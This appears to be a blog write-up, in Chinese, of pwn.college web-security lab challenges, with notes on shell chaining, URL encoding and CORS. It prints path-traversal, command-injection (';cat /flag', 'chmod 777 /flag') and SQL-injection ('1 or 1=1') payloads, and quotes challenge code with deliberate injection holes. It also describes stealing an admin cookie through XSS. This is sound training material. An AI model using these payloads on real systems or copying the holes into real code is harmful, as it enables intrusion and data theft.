---
title: PWN-College-Web-3-Writeup
date: 2024-09-04 11:02:00
author: 美食家李老叭
img: https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240606170337.png
top: false
hide: false
cover: false
coverImg: 
password: 
toc: true
mathjax: false
summary: CTF 
categories: CTF
tags:
    - Web
---
# pwn.college

https://pwn.college/intro-to-cybersecurity/web-security/

## 有价值的问题

### 1. 命令行参数的拼接

#### 1. |

`ls -l . | wc -l` 将前一个命令的直接结果作为第二个命令的输入

#### 2. &

`ls -l . & ls -l .`使前一个命令可以在后台执行，这样可以不用等待第一个命令的执行结果的情况下，执行第二个命令，不会阻塞第二个命令。

#### 3. \`\` 和 &

两种方式中`ls -l .`的输出中包含的换行符会被替代为空白字符。

**echo \`ls -l .\`**, 将`ls -l .`的输出结果作为一个值，返回到当前上下文中。

`echo $(ls -l .)` 这种命令执行的方式和上面这种命令执行的方式是一样的

#### 4. 传入换行符

`echo Test \n cat flag` 在换行符之后，会被当作新的指令进行执行。第一开始我居然没有看到`\r` 和 `\n`有对应的url编码。这里的`\n`指输入的换行符，就跟普通的shell执行命令是一样的。

在 URL 中传递换行符，可以使用 URL 编码来表示换行符。常见的换行符有两种形式：

1. **`\n`** (Line Feed, LF，换行符) 的 URL 编码是 **`%0A`**。
2. **`\r`** (Carriage Return, CR，回车符) 的 URL 编码是 **`%0D`**。

#### 5. \r和\n的区别

`Carriage Return` (`\r`) 和 `Line Feed` (`\n`) 是两种不同的控制字符，它们最早在打印机和文本处理系统中被用于表示文本的格式控制。两者的主要区别在于它们的历史使用背景以及它们如何在不同系统中被使用。

##### 1. **`\r` (Carriage Return)**：

- **回车符 (Carriage Return, CR)**，字符编码为 **`%0D`**。
- 它最早用于打字机，表示**将光标移回到行首**，但不换行。
- 在某些操作系统（例如早期的 Mac OS）中，**`\r` 单独用作换行符**。

##### 2. **`\n` (Line Feed)**：

- **换行符 (Line Feed, LF)**，字符编码为 **`%0A`**。
- 它用于**将光标移到下一行**，但不回到行首。
- 在 Unix 和类 Unix 系统（例如 Linux 和 macOS 的现代版本）中，**`\n` 用作换行符**。

##### 组合使用：

在很多现代系统中，`\r` 和 `\n` 被组合使用：

- **`\r\n`**：表示回到行首并换行，通常用于 **Windows 系统**。在 Windows 的文本文件中，一行的结束符是 `\r\n`。
- **`\n`**：在 **Unix/Linux 系统** 中，**表示换行并自动回到行首**，`\n` 是常见的行结束符。

##### URL 编码的区别：

- **`\r` 的 URL 编码** 是 **`%0D`**。
- **`\n` 的 URL 编码** 是 **`%0A`**。
- **`\r\n` 的组合** 在 URL 中就是 **`%0D%0A`**，这表示回车后换行。

##### 使用场景：

1. 在网络通信中：
   - 一些网络协议（如 HTTP、SMTP）使用 `\r\n` 来分隔行，例如 HTTP 的请求头和响应头就是通过 `\r\n` 结束每一行的。
2. 操作系统的文件格式：
   - Windows 使用 `\r\n` 作为行结束符。
   - Unix/Linux 系统使用 `\n` 作为行结束符。

### 总结：

- `\r` 和 `\n` 源于不同的系统和历史背景，分别代表**回车**和**换行**操作。
- 在现代系统中，**Windows** 通常使用 `\r\n` 组合表示换行，而 **Unix/Linux** 系统只使用 `\n`。
- 在 URL 编码中，`\r` 和 `\n` 分别被编码为 `%0D` 和 `%0A`，它们的组合是 `%0D%0A`。

### 2. 跨域的请求，是否要先向目的服务器发送option数据包

是的，跨域请求的确通常会在实际请求之前，先向目的服务器发送一个 **`OPTIONS`** 请求。这就是所谓的 **CORS 预检请求**（CORS Preflight Request）。浏览器在处理跨域请求时，使用 `OPTIONS` 请求来检查服务器是否允许跨域，并确认所需的 HTTP 方法和头是否被接受。

**跨域请求的预检请求**

跨域请求的流程如下：

1. 预检请求（Preflight Request）：

   - 当浏览器检测到跨域请求（例如请求的目标域与当前网页的域不同），且该请求不属于“简单请求”（例如请求使用了自定义头或方法，如 `PUT` 或 `DELETE`），浏览器会首先发出一个 `OPTIONS` 请求，询问服务器是否允许该跨域请求。
   - `OPTIONS` 请求并不会携带实际数据，它只是用于确认服务器是否允许特定的跨域操作。

2. 服务器响应：

   - 服务器需要正确地处理 

     ```
     OPTIONS
     ```

      请求，并返回允许跨域的头信息，例如：

     - `Access-Control-Allow-Origin`: 定义允许跨域的来源（可以是 `*` 表示所有域名）。
     - `Access-Control-Allow-Methods`: 指定允许的 HTTP 方法，如 `GET`, `POST`, `PUT` 等。
     - `Access-Control-Allow-Headers`: 列出允许使用的自定义头。

3. 实际请求：

   - 如果服务器正确响应了预检请求，并且允许跨域，浏览器才会继续发送实际的请求（例如 `GET`, `POST` 等），并带上实际数据。








## Path Traversal 2

`Path Traversal`, 第一开始我是用curl去请求，发现他总是会把我请求的路径给改掉。由于浏览器或者命令行工具（如 curl）会对 URL 进行规范化处理，在实际请求到达 Flask 应用之前，URL 中的路径部分会被自动解析并规范化。比如:
```bash
curl http:/challenge.localhost/flag/../../../../flag --> 它会自动给处理成/flag

hacker@web-security~path-traversal-2:~$ curl http://challenge.localhost/fortunes/../../../flag
<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>No /challenge/files/flag from directory /home/hacker</p>

```

所以还是要用echo + nc 的方式发最原始的http报文。这里一定要注意http报文的格式，新的头部字段前是没有空格的，直接用\r\n分割开就行了。

```bash
echo -e """GET fortunes/../../../flag HTTP/1.1\r\n\
Host: challenge.localhost\r\n\r\n\
""" | nc challenge.localhost 80


# echo -e "GET /index.html HTTP/1.1\r\n\
# Host: challenge.localhost\r\n\r\n" | nc challenge.localhost 80
```


## CMDi 1

利用传参构建，
`curl  http://challenge.localhost/?directory=/%3Bcat%20/flag`

## CMDi 2

这个不是利用`;`了，是利用 `|`将前面一个命令的执行结果作为下一个命令的初始输入。

`curl http://challenge.localhost/?directory=/%7ccat%20/flag`

## CMDi 3

跟SQL注入有点像，拼接闭合字符串。

`curl http://challenge.localhost/?directory=/%27%20%3bcat%20%27/flag`

## CMDi 5

这一关只告诉你执行的指令是什么？但并没有指令的回显。那可以修改flag文件的权限，然后自己查看。

`curl http://challenge.localhost/?filepath=1%3bchmod%20777%20/flag`

```python
#!/opt/pwn.college/python

import subprocess
import flask
import os

app = flask.Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def challenge():
    filepath = flask.request.args.get("filepath", "/challenge")
    command = f"touch {filepath}"
    print(f"DEBUG: {command=}")
    subprocess.run(
        command,                    # the command to run
        shell=True,                 # use the shell to run this command
        stdout=subprocess.PIPE,     # capture the standard output
        stderr=subprocess.STDOUT,   # 2>&1
        encoding="latin"            # capture the resulting output as text
    )

    return f"""
        <html><body>
        Welcome to the touch service! Please choose a file to touch:
        <form><input type=text name=filepath><input type=submit value=Submit></form>
        <hr>
        <b>Ran the command: touch {filepath}</b>
        </body></html>
        """

os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
port = 8080 if os.geteuid() else 80
app.config['SERVER_NAME'] = f"challenge.localhost:{port}"
app.run("challenge.localhost", port)

```


## SQLi 1

这一关有两个潜在的注入点，一个是`username`，一个是`pin`，后续的代码需要检查`username`字段必须为`admin`，所以就只剩下另外的一个注入点`pin`了。

`WHERE`字句后面是一个整体，你只要保证这个整体为`True`就可以。

`curl -L -c cookie i -v -X POST http://challenge.localhost:80/ -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&pin=1%20or%201=1`


```python
try:
    # https://www.sqlite.org/lang_select.html
    query = f'SELECT rowid, * FROM users WHERE username = "{username}" AND pin = {pin}'
    print(f"DEBUG: {query=}")
    user = db.execute(query).fetchone()
except sqlite3.Error as e:
    flask.abort(500, f"Query: {query}\nError: {e}")

if not user:
    flask.abort(403, "Invalid username or pin")
```


## XSS

我觉得题目的解释关于这几种常见漏洞的解释比较好，就抄下来了

```text
Semantic gaps can occur (and lead to security issues) at the interface of any two technologies. So far, we have seen them happen between:

    A web application and the file system, leading to path traversal.
    A web application and the command line shell, leading to command injection.
    A web application and the database, leading to SQL injection.

One part of the web application story that we have not yet looked at is the web browser. We will remedy that oversight with this challenge.

A modern web browser is an extraordinarily complex piece of software. It renders HTML, executes JavaScript, parses CSS, lets you access pwn.college, and much much more. Specifically important to our purposes is the HTML that you have seen being generated by every challenge in this module. When the web application generated paths, we ended up with path traversals. When the web application generated shell commands, we ended up with shell injections. When the web application generated SQL queries, we ended up with SQL injections. Do we really think HTML will fare any better? Of course not.

The class of vulnerabilities in which injections occur into client-side web data (such as HTML) is called Cross Site Scripting, or XSS for short (to avoid the name collision with Cascading Style Sheets). Unlike the previous injections, where the victim was the web server itself, the victims of XSS are other users of the web application. In a typical XSS exploit, an attacker will cause their own code to be injected into (typically) the HTML produced by a web application and viewed by a victim user. This will then allow the attacker to gain some control within the victim's browser, leading to a number of potential downstream shenanigans.

```

关于反射性xss的定义

Reflected XSS happens when a URL parameter is rendered into a generated HTML page in a way that, again, allows the attacker to insert HTML/JavaScript/etc. To carry out such an attack, an attacker typically needs to trick the victim into visiting a very specifically-crafted URL with the right URL parameters. This is unlike a Stored XSS, where an attacker might be able to simply make a post in a vulnerable forum and wait for victims to stumble onto it.

## XSS 3

首先我利用存储型xss，使用hacker登录，注入一个script脚本请求publish接口，这样再利用vicitm程序进行登录的时候，会自动请求publish接口，这样就能显示完整的flag。


## XSS 7

这个题目的提示说，可以只用nc监听某个端口就可以。但是nc监听端口，不会自动返回可以接受跨域请求的数据包，所以
我还是使用flask框架创建了一个服务器，返回相应的跨域请求数据头。然后接受admin对应的cookie字段。

明白了，这里需要用简单请求。具体可以看问题2，将cookie包含在Accept这个字段里面，这样不用引起跨域。

试了一下，还是会产生跨域。



## CSRF 3

这一关是要先访问`hacker.localhost:1337`, 然后在`hacker.localhost:1337`的`1.html`中使用`script`标签请求`challenge.localhost/ephemeral?msg=<script>alert("Test")<%2Fscript><script>`。

如果你想在`1.html`中使用`script`请求的话，你要注意，如果你的js代码中包含`</script>`, 浏览器在解析的时候，可能就提前闭合`<script>`了。这种情况下，代码不会正常运行。

我这一关没有用`script`去完成请求操作，只用了重定向完成的。这样不会用这种问题。

但是我发现了另一个问题，如果你在`input`的输入框中输入`<script><%2fscript>`，那么这个字符串还会再进行一次Url编码变成`<script><%252fscript>`，第二次url编码将`%`变成了`%25`。这跟直接在url输入框中直接传参的是不一样的，在url输入框中传参，只有一次url编码。


还有一个问题，如果你只输入`<script>alert("Test")`。那么浏览器会在页面的最后补全一个`</script>`。浏览器会尝试自动修复未闭合的 HTML 标签，以确保页面可以正确渲染。当你输入一个未闭合的` <script> `标签时，浏览器会假设你忘记闭合它，并自动在页面的末尾添加` </script>`。

原本是这样
```html
    <html><body>
    <h1>You have received an ephemeral message!</h1>
    The message: <script>alert("Test")
    <hr><form>Craft an ephemeral message:<input type=text name=msg action=/ephemeral><input type=submit value=Submit></form>
    </body></html>
```

浏览器渲染完成之后变成这样了
```html
    <html><body>
    <h1>You have received an ephemeral message!</h1>
    The message: 
    <script>
        alert("Test")
        <hr><form>Craft an ephemeral message:<input type=text name=msg action=/ephemeral><input type=submit value=Submit></form>
        </body></html>
    </script>
    </body></html>
```






##